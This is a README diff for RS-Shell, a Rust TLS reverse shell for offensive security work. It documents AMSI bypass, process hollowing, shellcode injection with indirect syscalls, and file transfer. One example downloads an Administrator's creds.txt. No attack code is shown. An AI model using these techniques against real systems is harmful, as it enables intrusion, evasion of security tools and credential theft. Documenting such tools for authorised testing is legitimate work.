@@ -1,10 +1,17 @@
+<h1 align="center">
+<br>
+<img src=img/logo_craiyon.png height="400" border="2px solid #555">
+<br>
+<strong>RS-Shell</strong>
+</h1>
+
 *"The worst Rust programmer you have ever seen"* - my mom
 
 *"But at least it works"* - still my mom, but not about me
 
-# RS-Shell
+## Description
 
-RS-Shell is a TLS over TCP reverse shell developped in Rust with client and server embedded in the same binary. This project has been mainly started to learn Rust with a tool that could help me in my work, and the code quality could be greatly improved.
+RS-Shell is a TLS over TCP reverse shell developped in Rust with client and server embedded in the same binary. This project has been mainly started to learn Rust with a tool that could help me in my work, and the code quality could be greatly improved. This project is like my Rust sandbox where I can test new things.
 
 Client and server are both cross-platform and work on Windows and Linux systems.
 
@@ -20,12 +27,14 @@ For the moment, the following features are present:
 
 * Semi-interactive reverse shell via TLS over TCP
 * File upload and download between server and client
-* Start a PowerShell interactive session with the ability to patch the AMSI in memory
+* Start a PowerShell interactive session with the ability to patch the AMSI in memory with or without indirect syscalls
 * Loading features :
-  * Load and execute a PE in the client memory
-  * Load and execute a PE in a remote process memory
-  * Load and execute a shellcode in a remote process memory
+  * Load and execute a PE in the client memory, **with or without indirect syscalls**
+  * Load and execute a PE in a remote process memory, **with or without indirect syscalls**
+  * Load and execute a shellcode in a remote process memory, **with or without indirect syscalls**
 * Autopwn the client machine and elevate the privileges to SYSTEM or root by exploiting a 0day in `tcpdump`
+
+To perform the indirect syscalls, I use the incredible [rust-mordor-rs](https://github.com/gmh5225/rust-mordor-rs) project initiate by [memN0ps](https://twitter.com/memN0ps). However, I use the version from my repository, which just patches little errors I have found regarding libraries versions and crate imports.
 
 ## How to
 
@@ -85,21 +94,29 @@ Then, on the target machine launch the client to connect back to your server wit
 [+] Custom integrated commands :
 
     [+] Loading commands
-    > load C:\path\to\PE_to_load
-        load a PE file in the client process memory and executes it. This could kill the reverse shell !
-    > load -h C:\path\to\PE_to_load C:\path\to\PE_to_hollow
+    > load C:\\path\\to\\PE_to_load
+        load a PE file in the client process memory and executes it. This will kill the reverse shell !
+    > load -h C:\\path\\to\\PE_to_load C:\\path\\to\\PE_to_hollow
         load a PE file in a remote process memory with process hollowing and executes it
-    > load -s C:\path\to\shellcode.bin C:\path\to\PE_to_execute
+    > load -s C:\\path\\to\\shellcode.bin C:\\path\\to\\PE_to_execute
         load a shellcode in a remote process memory and start a new thread with it
+
+    [+] Loading commands with indirect syscalls
+    > syscalls C:\\path\\to\\PE_to_load
+        load a PE file in the client process memory and executes it, with indirect syscalls. This will kill the reverse shell !
+    > syscalls -h C:\\path\\to\\PE_to_load C:\\path\\to\\PE_to_hollow
+        load a PE file in a remote process memory with process hollowing and executes it, with indirect syscalls
+    > syscalls -s C:\\path\\to\\shellcode.bin C:\\path\\to\\PE_to_execute
+        load a shellcode in a remote process memory and start a new thread with it, with indirect syscalls
 
     [+] Bypass commands
     > powpow
-        start a new interactive PowerShell session with the AMSI patched in memory
+        start a new interactive PowerShell session with the AMSI patched in memory, with or without indirect syscalls
 
     [+] Network commands
-    > download C:\file\to\download C:\local\path
+    > download C:\\file\\to\\download C:\\local\\path
         download a file from the remote system
-    > upload C:\local\file\to\upload C:\remote\path\to\write
+    > upload C:\\local\\file\\to\\upload C:\\remote\\path\\to\\write
         upload a file to the remote system
 
     [+] Special commands
@@ -115,7 +132,9 @@ The `load` commands permit to load and execute directly in memory:
 
 For example : `> load -h C:\Windows\System32\calc.exe C:\Windows\System32\cmd.exe`. This will start a `cmd.exe` process with hollowing, load a `calc.exe` image in the process memory, and then resume the thread to execute the calc.
 
-`powpow` starts an interactive PowerShell session with a PowerShell process where the AMSI `ScanBuffer` function has been patched in memory. This feature is not particularly opsec.
+On the other hand, the `syscalls` commands permit the same things, but everything is performed with indirect syscalls.
+
+`powpow` starts an interactive PowerShell session with a PowerShell process where the AMSI `ScanBuffer` function has been patched in memory. This feature is not particularly opsec. The patching operation can be performed with or without indirect syscalls.
 
 `download` permits to download a file from the client to the machine where the listener is running. For example `download C:\Users\Administrator\Desktop\creds.txt ./creds.txt`.
 
@@ -125,11 +144,17 @@ For example : `> load -h C:\Windows\System32\calc.exe C:\Windows\System32\cmd.ex
 
 ## Todo
 
-- [ ] Move all the Win32API related commands to the NTAPI with indirect syscalls
+- [x] Move all the Win32API related commands to the NTAPI with indirect syscalls
 - [ ] Implement other injection techniques
 - [ ] Implement a port forwarding solution
 - [ ] Find a way to create a fully proxy aware client
 - [ ] Implement a reverse socks proxy feature
+
+## Disclaimers
+
+This is an obvious disclaimer because I don't want to be held responsible if someone uses this tool against anyone who hasn't asked for anything.
+
+Usage of anything presented in this repo to attack targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program. Only use for educational purposes.
 
 ## Acknowledgements
 
@@ -138,3 +163,4 @@ For example : `> load -h C:\Windows\System32\calc.exe C:\Windows\System32\cmd.ex
 * Multiple projects by [memN0ps](https://github.com/memN0ps)
 * [RustPacker](https://github.com/Nariod/RustPacker) by [Nariod](https://github.com/Nariod)
 * Nik Brendler's blog posts about pipe communication between process in Rust. [Part 1](https://www.nikbrendler.com/rust-process-communication/) and [Part 2](https://www.nikbrendler.com/rust-process-communication-part-2/)
+* [rust-mordor-rs](https://github.com/gmh5225/rust-mordor-rs) by [memN0ps](https://twitter.com/memN0ps), an incredible library for indirect syscalls in Rust
